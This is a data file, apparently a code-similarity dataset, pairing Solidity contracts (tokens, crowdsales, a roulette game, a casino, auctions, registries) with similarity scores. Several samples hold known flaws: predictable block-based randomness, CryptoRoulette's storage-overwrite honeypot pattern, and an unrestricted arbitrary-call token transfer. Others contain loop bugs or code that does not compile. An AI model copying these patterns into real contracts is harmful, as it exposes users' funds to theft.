        string name;
        string tag;
    }


    mapping(bytes32 => FilterStruct) public filters;

    event LogNewFilter(address sender, bytes32 key, string Filternamename);

    function newFilter(bytes32 key, string memory name) public {
        filterSet.insert(key);
        FilterStruct storage f = filters[key];
        f.name = name;


        emit LogNewFilter(msg.sender, key, name);
    }

}",0.5171301938350115,"contract ClothesStores{

	

	mapping (uint => address) Indicador;

	

	struct Person{

		string name;

	}

	

	Person[] private personProperties;

	

	event createdPerson(string name);

	

	function createPerson(string memory _name) public {

	   uint identificador = personProperties.push(Person(_name))-1;

	    Indicador[identificador]=msg.sender;

	    emit createdPerson(_name);

	}

	

	function getPersonProperties(uint _identificador) external view returns(string memory)  {

	    

	    

	    Person memory People = personProperties[_identificador];

	    

	    return (People.name);

	}

}"
"contract send {
    receive rc = receive (address(0x0DCd2F752394c41875e259e00bb44fd505297caF)); 
    function snd(uint256 amount) public payable {
        rc.dep.transfer(amount);
    }
    function fallback() external payable{}
}",0.5932339950227894,"contract Bank is CutiePluginBase
{
    function run(
        uint40,
        uint256,
        address
    ) 
        public
        payable
        onlyCore
    {
        revert();
    }

    function runSigned(uint40, uint256, address)
        external
        payable
        onlyCore
    {
        
    }
}"
"contract randomizePairs {

    uint population_size;
    mapping(address => bool) inPopulation;
    mapping(uint => address[]) pair;
    mapping(address => uint) inPair;
    bytes32 entropy;
    mapping(uint => uint) iterationMemory;

    function commit() {
        require(inPopulation[msg.sender] == true);
        require(inPair[msg.sender] == 0);

        uint[] memorize;
        uint pairNumber = uint64(sha3(sha3(block.blockhash(block.number), entropy), now)) % (population_size / 2);

        if(pair[pairNumber].length < 2) {
            pair[pairNumber].push(msg.sender);
            inPair[msg.sender] = pairNumber;
        }
        else {
            memorize.push(pairNumber); 
            for(uint i = 0; i < 100; i++) {
                pairNumber = (pairNumber + i) % (population_size / 2); 
                if(pair[pairNumber].length == 2) {
                    if(iterationMemory[pairNumber] != 0) {
                        memorize.push(iterationMemory[pairNumber]); 
                        pairNumber = iterationMemory[pairNumber] - i; 
                    }
                }
                else {
                    pair[pairNumber].push(msg.sender);
                    inPair[msg.sender] = pairNumber;
                    break; 
                }
            }
            
            for(uint m = 0; m < memorize.length; m++) {
                iterationMemory[mem[m]] = pairNumber;
            }
    }
    }
}",0.5153425122902815,"contract CryptoRoulette {



    uint256 public secretNumber;

    uint256 public lastPlayed;

    uint256 public betPrice = 0.1 ether;

    address public ownerAddr;



    struct Game {

        address player;

        uint256 number;

    }

    Game[] public gamesPlayed;



    function CryptoRoulette() public {

        ownerAddr = msg.sender;

        generateNewRandom();

    }



    function generateNewRandom() internal {

        

        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 16;

    }



    function play(uint256 number) payable public {

        require(msg.value >= betPrice && number < 16);



        Game game;

        game.player = msg.sender;

        game.number = number;

        gamesPlayed.push(game);



        if (number == secretNumber) {

            

            if(msg.value*15>this.balance){

                msg.sender.transfer(this.balance);

            }

            else{

                msg.sender.transfer(msg.value*15);

            }

        }



        generateNewRandom();

        lastPlayed = now;

    }



    function kill() public {

        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {

            suicide(msg.sender);

        }

    }



    function() public payable { }

}"
"contract C {  
bytes32 public temp;  
function hashingsha3 (bytes s)   {  
temp= sha3(s);  
}  
function hashingsha256 (bytes s) {  
temp= sha256(s);  
}  
function kec (bytes s)  {  
temp= keccak256(s);  
}  
}",0.5264020613112003,"contract Registra1000 {

   struct Arquivo {
       bytes shacode;
   }

   bytes[] arquivos;
   
   function Registra() public {
       arquivos.length = 1;
   }

   function setArquivo(bytes shacode) public {
       arquivos.push(shacode);
   }
   
 
}"
"contract Bar {
    bool public barBool = false;
    Foo myFoo;

    function Bar(address _myFooAddr) public {
        myFoo = Foo(_myFooAddr);
    }

    function barFunc() public {
        barBool = myFoo.fooFunc(barBool);
    }
}",0.5673101518556168,"contract Upcoin {

    uint8 public decimals = 18;



    function isUpcoin() public pure returns (bool);

    function transferOrigin(address _to, uint256 _value) public returns (bool);

}"
"contract ArrayTest {
  uint[2] a;

  event ReverseLoop(uint n);
  event NormalLoop(uint n);

  constructor() public {
    a[0] = 1;
    a[1] = 2;
  }

  function reverseLoop() external {
    for (uint i = a.length-1; i >= 0; i--) {
        emit ReverseLoop(a[i]);
    }
  }

  function normalLoop() external {
    for (uint i = 0; i < a.length; i++) {
        emit NormalLoop(a[i]);
    }
  }
}",0.5712786325254354,"contract MultiEthSender {

    

    event Send (

        uint256 _amount,

        address indexed_receiver

    );



    function multiSendEth(uint256 amount, address[] list) public returns (bool) {

        uint listLength = list.length;

        for (uint i=0; i<listLength; i++) {

            list[i].transfer(amount);

            emit Send(amount, list[i]);

        }

        

        return true;

    }

    

    function () external payable {}



}"
"contract Redpack {
    address public owner;

    uint public minPackAmount = 1 * (10 ** 18); 
    uint public maxPackAmount = 10000 * (10 ** 18); 
    uint public constant LIMIT_AMOUNT_OF_PACK = 100000 * (10 ** 18);

    uint public minPackCount = 1; 
    uint public maxPackCount = 10000; 

    uint public totalPackAmounts = 0; 
    uint public numberOfPlayers = 0; 
    address[] public players; 

    struct Player {
        uint id; 
        address owner; 
        uint amount; 
        uint balance; 
        uint count; 
        uint amountPerPack; 
        bool isRandom; 
        uint[] randomAmount; 
        uint randomFactor; 
        address[] hunterList; 
        mapping(address => uint) hunterInfo; 
    }

    
    mapping(uint => Player) public playerInfo;

    
    function() public payable {}
    
    
    
    
    


    
    
    
    constructor (uint _minPackAmount, uint _maxPackAmount) public {
        owner = msg.sender;

        if(_minPackAmount > 0) minPackAmount = _minPackAmount;
        if(_maxPackAmount > 0 && _maxPackAmount <= LIMIT_AMOUNT_OF_PACK)
            maxPackAmount = _maxPackAmount;
    }

    function kill() public {
        if(msg.sender == owner) selfdestruct(owner);
    }

    
    function getPlayerInfo() public view returns (
        uint nTotalPackAmounts,
        uint nNumberOfPlayers,
        address[] playerList
    ) {
        return (
        totalPackAmounts,
        numberOfPlayers,
        players
        );
    }

    
    
    

    event redpackCreated(uint id);
    event redpackWithdraw(uint amount);

    
    
    
    
    function toll(uint count, bool isRandom) public payable {
        require(msg.value >= minPackAmount && msg.value <= maxPackAmount, ""amount out of range(1..10000"");
        require(count >= minPackCount && count <= maxPackCount, ""最少1个, 最多10000个"");

        uint id = numberOfPlayers;
        playerInfo[id].amount = msg.value;
        playerInfo[id].balance = msg.value;
        playerInfo[id].count = count;
        playerInfo[id].isRandom = isRandom;
        playerInfo[id].id = id;
        if (isRandom) {
            uint total = 0;
            for (uint i = 0; i < count; i++) {
                playerInfo[id].randomAmount[i] = uint(keccak256(abi.encodePacked(now, msg.sender, i))) % 100;
                total += playerInfo[id].randomAmount[i];
            }
            playerInfo[id].randomFactor = 100 / total; 
        } else {
            playerInfo[id].amountPerPack = msg.value / count; 
        }

        totalPackAmounts += msg.value;
        numberOfPlayers++; 
        players.push(msg.sender); 

        emit redpackCreated(id);
    }

    
    
    function withdrawBalance(uint id) public {
        require(msg.sender == playerInfo[id].owner, ""not the owner."");
        require(playerInfo[id].balance > 0, ""balance is 0."");
        require(playerInfo[id].balance <= totalPackAmounts, ""not enough budget."");

        msg.sender.transfer(playerInfo[id].balance);
        totalPackAmounts -= playerInfo[id].balance;

        emit redpackWithdraw(playerInfo[id].balance);
    }

    
    
    
    
    
    
    
    
    function getPackInfo(uint id) public view returns (
        uint amount,
        uint balance,
        uint count,
        uint amountPerPack,
        bool isRandom
    ) {
        Player storage player = playerInfo[id];
        return (
        player.amount,
        player.balance,
        player.count,
        player.amountPerPack,
        player.isRandom
        );
    }

    
    
    

    event redpackGrabbed(uint amount);

    
    
    
    function checkHunterExists(uint _id, address _hunter) public view returns(bool) {
        for (uint256 i = 0; i < playerInfo[_id].hunterList.length; i++){
            if(playerInfo[_id].hunterList[i] == _hunter) return true;
        }
        return false;
    }

    
    
    function hunting(uint id) public payable {
        
        require(playerInfo[id].balance > 0, ""redpack is empty"");
        require(playerInfo[id].count > playerInfo[id].hunterList.length, ""exceed number of redpacks"");
        require(!checkHunterExists(id, msg.sender), 'already grabbed');

        if(playerInfo[id].isRandom) {
            
            uint index = playerInfo[id].hunterList.length;
            uint value = playerInfo[id].randomFactor * playerInfo[id].randomAmount[index] * playerInfo[id].amount;
            if (playerInfo[id].hunterList.length + 1 >= playerInfo[id].count) {
                
                hunted(id, playerInfo[id].balance);
                playerInfo[id].balance = 0;

            } else {
                hunted(id, value);
                playerInfo[id].balance -= value;
            }
        } else {
            
            if (playerInfo[id].balance > playerInfo[id].amountPerPack) {
                
                if (playerInfo[id].balance < playerInfo[id].amountPerPack * 2) {
                    hunted(id, playerInfo[id].balance);
                    playerInfo[id].balance = 0; 
                } else {
                    
                    hunted(id, playerInfo[id].amountPerPack);
                    playerInfo[id].balance -= playerInfo[id].amountPerPack;
                }
            } else {
                
                hunted(id, playerInfo[id].balance);
                playerInfo[id].balance = 0;
            }
        }
    }
    function hunted(uint _id, uint _amount) internal {
        require(_amount <= totalPackAmounts, ""grab: not enough budget."");
        msg.sender.transfer(_amount);
        totalPackAmounts -= _amount;
        playerInfo[_id].hunterList.push(msg.sender);

        emit redpackGrabbed(_amount);
    }

    
    
    

}",0.5734828579631861,"contract RiemannianNonorientableManifolds is EtherealFoundationOwned {
    string public constant CONTRACT_NAME = ""RiemannianNonorientableManifolds"";
    string public constant CONTRACT_VERSION = ""B"";
	string public constant QUOTE = ""&#39;Everything is theoretically impossible, until it is done.&#39; -Robert A. Heinlein"";
    
    string public constant name = ""Riemannian Nonorientable Manifolds"";
    string public constant symbol = ""RNM"";
	
    uint256 public constant decimals = 18;  
	
    bool private tradeable;
    uint256 private currentSupply;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address=> uint256)) private allowed;
    mapping(address => bool) private lockedAccounts;  
	
		
    event RecievedEth(address indexed _from, uint256 _value, uint256 timeStamp);
	
	function () payable public {
		RecievedEth(msg.sender, msg.value, now);		
	}
	
	event TransferedEth(address indexed _to, uint256 _value);
	function FoundationTransfer(address _to, uint256 amtEth, uint256 amtToken) public onlyOwner
	{
		require(this.balance >= amtEth && balances[this] >= amtToken );
		
		if(amtEth >0)
		{
			_to.transfer(amtEth);
			TransferedEth(_to, amtEth);
		}
		
		if(amtToken > 0)
		{
			require(balances[_to] + amtToken > balances[_to]);
			balances[this] -= amtToken;
			balances[_to] += amtToken;
			Transfer(this, _to, amtToken);
		}
		
		
	}	
	
	
	
	
    function RiemannianNonorientableManifolds(
		uint256 initialTotalSupply, 
		address[] addresses, 
		uint256[] initialBalances, 
		bool initialBalancesLocked
		) public
    {
        require(addresses.length == initialBalances.length);
        
        currentSupply = initialTotalSupply * (10**decimals);
        uint256 totalCreated;
        for(uint8 i =0; i < addresses.length; i++)
        {
            if(initialBalancesLocked){
                lockedAccounts[addresses[i]] = true;
            }
            balances[addresses[i]] = initialBalances[i]* (10**decimals);
            totalCreated += initialBalances[i]* (10**decimals);
        }
        
        
        if(currentSupply < totalCreated)
        {
            selfdestruct(msg.sender);
        }
        else
        {
            balances[this] = currentSupply - totalCreated;
        }
    }
    
	
    event SoldToken(address indexed _buyer, uint256 _value, bytes32 note);
    function BuyToken(address _buyer, uint256 _value, bytes32 note) public onlyOwner
    {
		require(balances[this] >= _value && balances[_buyer] + _value > balances[_buyer]);
		
        SoldToken( _buyer,  _value,  note);
        balances[this] -= _value;
        balances[_buyer] += _value;
        Transfer(this, _buyer, _value);
    }
    
    function LockAccount(address toLock) public onlyOwner
    {
        lockedAccounts[toLock] = true;
    }
    function UnlockAccount(address toUnlock) public onlyOwner
    {
        delete lockedAccounts[toUnlock];
    }
    
    function SetTradeable(bool t) public onlyOwner
    {
        tradeable = t;
    }
    function IsTradeable() public view returns(bool)
    {
        return tradeable;
    }
    
    
    function totalSupply() constant public returns (uint256)
    {
        return currentSupply;
    }
    function balanceOf(address _owner) constant public returns (uint256 balance)
    {
        return balances[_owner];
    }
    function transfer(address _to, uint256 _value) public notLocked returns (bool success) {
        require(tradeable);
         if (balances[msg.sender] >= _value && _value > 0 && balances[_to] + _value > balances[_to]) {
             Transfer( msg.sender, _to,  _value);
             balances[msg.sender] -= _value;
             balances[_to] += _value;
             return true;
         } else {
             return false;
         }
     }
    function transferFrom(address _from, address _to, uint _value)public notLocked returns (bool success) {
        require(!lockedAccounts[_from] && !lockedAccounts[_to]);
		require(tradeable);
        if (balances[_from] >= _value
            && allowed[_from][msg.sender] >= _value
            && _value > 0
            && balances[_to] + _value > balances[_to]) {
                
            Transfer( _from, _to,  _value);
                
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        } else {
            return false;
        }
    }
    
    function approve(address _spender, uint _value) public returns (bool success) {
        Approval(msg.sender,  _spender, _value);
        allowed[msg.sender][_spender] = _value;
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint remaining){
        return allowed[_owner][_spender];
    }
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
   
   modifier notLocked(){
       require (!lockedAccounts[msg.sender]);
       _;
   }
}"
"contract B {
  using Roles for Roles.Role;
  Roles.Role private adminRole;

  constructor(address _adminRole) public {
    adminRole.add(_adminRole);
  }

  function protectedFunc() public {
    require(adminRole.has(msg.sender), ""DOES_NOT_HAVE_ADMIN_ROLE"");
    ...
  }

}",0.5701471382800793,"contract managed {

    address public admin;



    constructor() public {

        admin = msg.sender;

    }



    modifier onlyAdmin {

        require(msg.sender == admin);

        _;

    }



    function transferOwnership(address newAdmin) onlyAdmin public {

        admin = newAdmin;

    }

}"
"contract Auction {
    
    
    struct Item { 
        uint itemId;          
        uint[] itemTokens;    
    }

    
    struct Person { 
        uint remainingTokens; 
        uint personId;        
        address addr;         
    }

    mapping(address => Person) tokenDetails; 
    Person [4] bidders;

    Item [3] public items;       
    address[3] public winners;   
    address public beneficiary;  
    uint bidderCount=0;          

    
    function Auction() public payable{                     
        beneficiary = msg.sender;                          
        uint[] memory emptyArray; 
        items[0] = Item({itemId:0,itemTokens:emptyArray});
        items[1] = Item({itemId:1,itemTokens:emptyArray}); 
        items[2] = Item({itemId:2,itemTokens:emptyArray}); 
    }

    function register() public payable{
        bidders[bidderCount].personId = bidderCount;
        bidders[bidderCount].addr = addr;                  
        bidders[bidderCount].remainingTokens = 5;          
        tokenDetails[msg.sender]=bidders[bidderCount];
        bidderCount++; 
    }

    function bid(uint _itemId, uint _count) public payable{
        if (tokenDetails[msg.sender].remainingTokens < _count) return; 
        if (_itemId > 2) return;                                       
        (tokenDetails[msg.sender].remainingTokens - _count);           
        bidders[tokenDetails[msg.sender].personId].remainingTokens= tokenDetails[msg.sender].remainingTokens; 
        Item storage bidItem = items[_itemId]; 
        for(uint i=0; i<_count;i++) { 
            bidItem.itemTokens.push(tokenDetails[msg.sender].personId); 
        }
    }

    function revealWinners() public {
         for (uint id = 0; id < 3; id++) { 
             Item storage currentItem=items[id]; 
             If (currentItem.itemTokens.length != 0);
                 uint randomIndex = (block.number / currentItem.itemTokens.length)% currentItem.itemTokens.length; 
                 uint winnerId = currentItem.itemTokens[randomIndex];
                 return winnerId;                                      
            }
        }
    }",0.5724394411498908,"contract TerocoinCrowdsale {
    using SafeMath for uint256;

    address owner;
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    TerocoinToken public token;
    address public wallet;
    uint256 public rate;
    uint256 public weiRaised;

    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

    constructor(uint256 _rate, address _wallet, TerocoinToken _token) public {
        require(_rate > 0);
        require(_wallet != address(0));
        require(_token != address(0));

        owner = msg.sender;

        rate = _rate;
        wallet = _wallet;
        token = _token;
    }

    function () external payable {
        buyTokens(msg.sender);
    }

    function buyTokens(address _beneficiary) public payable {
        require(_beneficiary != address(0));
        require(msg.value != 0);

        uint256 weiAmount = msg.value;

        uint256 tokens = _getTokenAmount(weiAmount);
        weiRaised = weiRaised.add(weiAmount);

        _processPurchase(_beneficiary, tokens);
        emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);

        wallet.transfer(msg.value);
    }

    function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        token.approve(_beneficiary, _tokenAmount);
        token.transferFrom(wallet, _beneficiary, _tokenAmount);
    }

    function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {
        _deliverTokens(_beneficiary, _tokenAmount);
    }

    function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {
        return _weiAmount.mul(rate);
    }

    function kill() public onlyOwner {
        selfdestruct(owner); 
    }
}"
"contract Tickets {
  struct Ticket {
    uint serie;
    uint number;
    uint datetime;
  }

  Ticket[] tickets;

  function addTicket(Ticket memory newTicket) public returns(bool success) {
    tickets.push(newTicket);
    return true;
  }

  function getTickets() public view returns(Ticket[] memory) {
    return tickets;
  }
}",0.5994489734348785,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract ManagerDb {

    struct ManagerStruct {
        bytes32 firstname;
        bytes32 lastname;
        bytes32 email;
        uint index;
    }

    mapping ( address => ManagerStruct ) Managers;
    address[] public managerIndex; 

    function insertManager(
        address managerAddress,
        bytes32 firstName,
        bytes32 lastName,
        bytes32 email
    )
        returns (bool)
    {

        ManagerStruct memory newManager;
        newManager.firstname = firstName;
        newManager.lastname = lastName;
        newManager.email = email;
        newManager.index = managerIndex.push(managerAddress)-1;

        Managers[managerAddress] = newManager;
        return true;
    }

    
    function getArrayData() constant returns (bytes32[] _data1) {

        uint arrLength = managerIndex.length;
        bytes32[] memory arrData1 = new bytes32[](arrLength);
        for (uint i=0; i <= arrLength; i++){
            address addr = managerIndex[i];
            ManagerStruct ms = Managers[addr];
            arrData1[i] = ms.firstname;
        }

        return (arrData1);
    }
}",0.5636359197097162,"contract MultiOwnable {

    address public manager; 

    address[] public owners;

    mapping(address => bool) public ownerByAddress;



    event SetManager(address manager);

    event SetOwners(address[] owners);



    modifier onlyOwner() {

        require(ownerByAddress[msg.sender] == true);

        _;

    }



    modifier onlyManager() {

        require(msg.sender == manager);

        _;

    }



    

    constructor() public {

        manager = msg.sender;

    }



    

    function setOwners(address[] _owners) onlyManager public {

        _setOwners(_owners);

    }



    function _setOwners(address[] _owners) internal {

        for(uint256 i = 0; i < owners.length; i++) {

            ownerByAddress[owners[i]] = false;

        }



        for(uint256 j = 0; j < _owners.length; j++) {

            ownerByAddress[_owners[j]] = true;

        }

        owners = _owners;

        emit SetOwners(_owners);

    }



    function getOwners() public constant returns (address[]) {

        return owners;

    }



    function setManager(address _manager) onlyManager public {

        manager = _manager;

        emit SetManager(_manager);

    }

}"
"contract Casino is usingOraclize {
   address owner;
   uint public betAmount = 30 finney; 
   uint public totalBets; 
   uint public numberOfBets; 
   
   uint public limitAmountOfBets = 2; 
   uint public numberWinner; 
   bool public gameStatus;
   uint public stage = 0;
   uint public winnerEtherAmount;
   mapping(uint => address[]) public numberBetPlayers; 
   mapping(address => uint) public playerBetsNumber; 

   uint public numberLengths;

   modifier onEndGame() {
       if(numberOfBets >= limitAmountOfBets) _;
   }

   
   function Casino(uint _betAmount, uint _limitAmountOfBets) {
       owner = msg.sender; 

       if(_betAmount > 0) betAmount = _betAmount;
       if(_limitAmountOfBets > 0) limitAmountOfBets = _limitAmountOfBets;

       oraclize_setProof(proofType_Ledger); 
   }

   
   function checkPlayerExists(address player) constant public returns(bool) {
       if(playerBetsNumber[player] > 0) return true;
       else return false;
   }

   
   function bet(uint numberToBet) payable {
       require(numberOfBets <= limitAmountOfBets); 
       require(!checkPlayerExists(msg.sender)); 
       require(numberToBet >=1 && numberToBet <= 10); 
       require(msg.value == betAmount); 
       gameStatus = true;

       playerBetsNumber[msg.sender] = numberToBet;
       numberBetPlayers[numberToBet].push(msg.sender);

       numberOfBets += 1;
       totalBets += msg.value;

       if(numberOfBets >= limitAmountOfBets) generateNumberWinner();
   }

   
   function generateNumberWinner() payable onEndGame {
       gameStatus = false;
       stage = 1;
       uint numberRandomBytes = 7;
       uint delay = 0;
       uint callbackGas = 200000;

       oraclize_newRandomDSQuery(delay, numberRandomBytes, callbackGas);
   }

   function __callback(bytes32 _queryId, string _result, bytes _proof) {
       stage = 2;
       require (msg.sender == oraclize_cbAddress());

       if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {
           stage = 9;
       }
       else {
           numberWinner = uint(sha3(_result)) % 10;
           
           distributePrizes();
       }
   }

   function distributePrizes() internal onEndGame {
       stage = 3;

       if(numberBetPlayers[numberWinner].length > 0) {
           winnerEtherAmount = totalBets / numberBetPlayers[numberWinner].length; 

           for(uint i = 0; i < numberBetPlayers[numberWinner].length; i++) { 
               numberBetPlayers[numberWinner][i].transfer(winnerEtherAmount);
           }
       }

       for(uint j = 1; j <= 10; j++) {
           if(numberBetPlayers[j].length > 0) delete numberBetPlayers[j];
       }

       totalBets = 0;
       numberOfBets = 0;
   }
}",0.5753530681310316,"contract CryptoJingles is Ownable {
    
    struct Purchase {
        address user;
        uint blockNumber;
        bool revealed;
        uint numSamples;
        bool exists;
    }
    
    event Purchased(address indexed user, uint blockNumber, uint numJingles, uint numOfPurchases);
    event JinglesOpened(address byWhom, address jingleOwner, uint currBlockNumber);
    
    mapping (uint => bool) public isAlreadyUsed;
    
    mapping(address => string) public authors;

    uint numOfPurchases;
    
    uint MAX_SAMPLES_PER_PURCHASE = 15;
    uint SAMPLE_PRICE = 10 ** 15;
    uint SAMPLES_PER_JINGLE = 5;
    uint NUM_SAMPLE_RANGE = 1000;
    
    Sample public sampleContract;
    Jingle public jingleContract;
    
    function CryptoJingles(address _sample, address _jingle) public {
        numOfPurchases = 0;
        sampleContract = Sample(_sample);
        jingleContract = Jingle(_jingle);
    }
    
    function buySamples(uint _numSamples, address _to) public payable {
        require(_numSamples <= MAX_SAMPLES_PER_PURCHASE);
        require(msg.value >= (SAMPLE_PRICE * _numSamples));
        require(_to != 0x0);
        
         for (uint i = 0; i < _numSamples; ++i) {
            
            bytes32 blockHash = block.blockhash(block.number - 1);
            
            uint randomNum = randomGen(blockHash, i);
            sampleContract.mint(_to, randomNum);
        }
        
        Purchased(_to, block.number, _numSamples, numOfPurchases);
        
        numOfPurchases++;
    }
    
    function composeJingle(string name, uint32[5] samples, uint8[20] settings) public {
        require(jingleContract.uniqueJingles(keccak256(samples)) == false);
        
        uint32[5] memory sampleTypes;
        
        
        for (uint i = 0; i < SAMPLES_PER_JINGLE; ++i) {
            bool isOwner = sampleContract.isTokenOwner(samples[i], msg.sender);
            
            require(isOwner == true && isAlreadyUsed[samples[i]] == false);
            
            isAlreadyUsed[samples[i]] = true;
            
            sampleTypes[i] = sampleContract.tokenType(samples[i]);
            sampleContract.removeSample(msg.sender, samples[i]);
        }
        
        
        jingleContract.composeJingle(msg.sender, samples, sampleTypes, name,
                            authors[msg.sender], settings);
    }
    
    
    function setAuthorName(string _name) public {
        authors[msg.sender] = _name;
    }
    
    function randomGen(bytes32 blockHash, uint seed) constant public returns (uint randomNumber) {
        return (uint(keccak256(blockHash, block.timestamp, numOfPurchases, seed )) % NUM_SAMPLE_RANGE);
    }
    
    
    function withdraw(uint _amount) public onlyOwner {
        require(_amount <= this.balance);
        
        msg.sender.transfer(_amount);
    }
    
}"
"contract DataEntityContract {


    DataEntity DE;

    constructor(string memory _name,string[] memory _relatedEntities, string memory _date, string memory _fileName, string memory _annotations) public
    {
        DE = DataEntity(_name, 'URN', _fileName, new string[](0), _relatedEntities, 'references', _annotations, msg.sender, _date);
    }

    struct DataEntity {
        
        string dataEntityName;
        string rawFileURN;
        string fileName;
        string[] nameChangeHistory;
        string[] sources;
        string references;
        string annotations;
        address createdUpdateBy;
        string when;
    }

    function editDE() public {
        DE.annotations = ""edited"";
    }

    function getAnnotations() public view returns(string memory) {
        return (DE.annotations);
    }

}",0.598647571629062,"contract ClothesStores{

	

	mapping (uint => address) Indicador;

	

	struct Person{

		string name;

		string nick;

		string email;

	}

    

	Person[] private personProperties;

	

	event createdPerson(string name,string nick,string email);

	

	function createPerson(string memory _name, string memory _nick, string memory _email) public {

	   uint identificador = personProperties.push(Person(_name,_nick,_email))-1;

	    Indicador[identificador]=msg.sender;

	    emit createdPerson(_name,_nick,_email);

	}

	

	function getPersonProperties(uint _identificador) external view returns(string memory, string memory, string memory)  {

	    

	    

	    

	    Person memory People = personProperties[_identificador];

	    

	    return (People.name,People.nick,People.email);

	}

}"
"contract FlattenedDEC
{
    address owner;
    string public name;
    mapping (string => address) dataEntities;
    string[] public dataEntityNames;
    uint count = 0;
    uint public DataEntitiesCount = 0;
    mapping(uint => Lineage) public lineageInfo;
    mapping(uint => DE) public DataEntities;

    event DataEntityEdited(
        string name,
        string comments,
        address editedBy
    );

    constructor() public
    {
        name = ""DataEntityCatalogue Master Contract"";
        owner = msg.sender;
    }

    function createNewDataEntity(string memory _name, string[] memory _dataEntities, string memory _date, string memory _fileName, string memory _annotations) public returns(address _new){
        DataEntityContract instance = new DataEntityContract(_name,_dataEntities, _date, _fileName, _annotations);
        return address(instance);
    }

    function editDE(string memory _name) public{
        DataEntityContract de = DataEntityContract(dataEntities[_name]);
        de.editDE();
        emit DataEntityEdited(_name, ""edited"", msg.sender);
    }",0.5787553114647437,"contract Token {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
    uint internal _totalSupply;
    mapping (address => uint) internal _balanceOf;
    mapping (address => mapping (address => uint)) internal _allowances;
    
    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply;
    }
    
    function name() public constant returns (string) {
        return _name;
    }
    
    function symbol() public constant returns (string) {
        return _symbol;
    }
    
    function decimals() public constant returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public constant returns (uint) {
        return _totalSupply;
    }
    
    function balanceOf(address _addr) public constant returns (uint);
    function transfer(address _to, uint _value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint _value);
}"
"contract AjTokenSale {
address admin;
AjToken public tokenContract;
uint256 public tokenPrice;
uint256 public tokensSold;

event Sell(address _buyer, uint256 _amount);

function AjTokenSale(AjToken _tokenContract, uint256 _tokenPrice) public {
    
    admin = msg.sender;
    
    tokenContract = _tokenContract;
    
    tokenPrice = _tokenPrice;
}    



function multiply(uint x, uint y) internal pure returns(uint z) {

    require (y == 0 || (z = x * y)/y == x);

}


function buyTokens(uint256 _numberOfTokens) public payable {
    

    require(msg.value == multiply(_numberOfTokens , tokenPrice));

    

    require(tokenContract.balanceOf(this) >= _numberOfTokens);

    
    require(tokenContract.transfer(msg.sender, _numberOfTokens));
    
    tokensSold += _numberOfTokens;
    
    Sell(msg.sender, _numberOfTokens); 
}



function endSale() public {
    
    require(msg.sender == admin);       
    
    require(tokenContract.transfer(admin, tokenContract.balanceOf(this))); 
    admin.transfer(address(this).balance);

}

}",0.5985263137669042,"contract Kongtou {
    
    address public owner;
    
    constructor() payable public  {
        owner = msg.sender;
    }
    
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    
    function() payable public {
        
    }

    
    function deposit() payable public{
    }
    
    
    function transferETH(address _to) payable public returns (bool){
        require(_to != address(0));
        require(address(this).balance > 0);
        _to.transfer(address(this).balance);
        return true;
    }
    
    
    function transferETH(address[] _tos, uint256 amount) public returns (bool) {
        require(_tos.length > 0);
        for(uint32 i=0;i<_tos.length;i++){
            _tos[i].transfer(amount);
        }
        return true;
    }
    
    
    function getETHBalance() view public returns(uint){
        return address(this).balance;
    }
    
   
   function transferToken(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transfer(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }


  
   
    
}"
"contract Origin {

struct OriginInfo
{
    string airportName;
    uint32 checkInTime; 
    uint8 bagWeight;
    address clientAddress;
    bool itsHere;
}
mapping (uint256 => OriginInfo) origins;
uint256 public originNonce;

constructor() public
{
    originNonce = 1;
}

function insertOrigin(string _airportName, uint32 _checkInTime, uint8 _bagWeight) 
    public 
{
    origins[originNonce] = OriginInfo(_airportName, _checkInTime, _bagWeight, msg.sender, true);
    originNonce += 1;

    recoverOrigin(originNonce);
}

function recoverOrigin(uint256 _originId) 
    private view 
    returns (string, uint32, uint8, address, bool) 
{
    OriginInfo memory origin = origins[_originId];
    return (
        origin.airportName,
        origin.checkInTime, 
        origin.bagWeight, 
        origin.clientAddress, 
        origin.itsHere
    );
}
}",0.5469202228567155,"contract BasicToken is BasicTokenInterface{
    using SafeMath for uint;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    uint public totalSupply;
    mapping (address => uint256) internal balances;
    
    modifier checkpayloadsize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    } 

    function transfer(address _to, uint256 _value) public checkpayloadsize(2*32) returns (bool success) {
        require(balances[msg.sender] >= _value);
        success = true;
        balances[msg.sender] -= _value;

        
        if(_to == address(this)){
            totalSupply = totalSupply.sub(_value);
        }else{
            balances[_to] += _value;
        }
        emit Transfer(msg.sender, _to, _value); 
        return success;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}"
"contract Travel{


struct TravelInfo {
    uint test;
    
}

mapping(uint => Travel) travels;
uint public travelsRegistryCount;

function addOrigin (string _airportName, uint32 _checkInTime, uint8 _bagWeight) public {
    insertOrigin(_airportName, _checkInTime, _bagWeight);

}
}",0.5304325116271607,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
